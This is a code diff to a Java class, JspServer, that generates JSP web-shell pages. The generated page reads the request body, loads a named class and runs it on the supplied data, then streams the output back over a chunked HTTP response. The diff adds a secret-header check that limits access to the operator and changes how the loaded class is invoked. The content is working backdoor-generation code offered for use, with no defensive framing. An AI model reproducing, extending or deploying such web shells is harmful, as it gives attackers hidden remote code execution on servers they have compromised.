@@ -1,5 +1,7 @@
 package org.leo.jmg.jsp.httpchunk;
 
+import org.leo.jmg.jsp.WebShellRequestGuard;
+
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
@@ -8,6 +10,11 @@ import java.util.zip.GZIPOutputStream;
 
 public class JspServer {
     public String wrap(String coreClassName,byte[] coreClass,int respCode) throws IOException {
+        return wrap(coreClassName, coreClass, respCode, null, null);
+    }
+
+    public String wrap(String coreClassName, byte[] coreClass, int respCode,
+                       String headerName, String headerValue) throws IOException {
         if (respCode < 200 || respCode == 204 || respCode == 205 || respCode == 304) {
             throw new IllegalArgumentException("httpchunk响应状态必须允许持续响应体: " + respCode);
         }
@@ -26,6 +33,7 @@ public class JspServer {
                   "<%@ page import=\"java.math.BigInteger\" %>\n" +
                   "<%@ page import=\"java.lang.reflect.Method\" %>\n" +
                   "<%\n" +
+                  WebShellRequestGuard.source(headerName, headerValue, "    ") +
                   "    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n" +
                   "    byte[] buffer = new byte[1024];\n" +
                   "    int bytesRead;\n" +
@@ -68,7 +76,7 @@ public class JspServer {
                   "            responseType=1;\n" +
                   "            byteArrayOutputStream=new ByteArrayOutputStream();\n" +
                   "            byteArrayOutputStream.write(data);\n" +
-                  "            Class.forName(\""+coreClassName+"\").newInstance().equals(byteArrayOutputStream);\n" +
+                  "            ((java.lang.reflect.InvocationHandler)Class.forName(\""+coreClassName+"\").newInstance()).invoke(null, null, new Object[]{byteArrayOutputStream});\n" +
                   "            respData=byteArrayOutputStream.toByteArray();\n" +
                   "        }else{break;}\n" +
                   "        if(respData.length>16777216){break;}\n" +
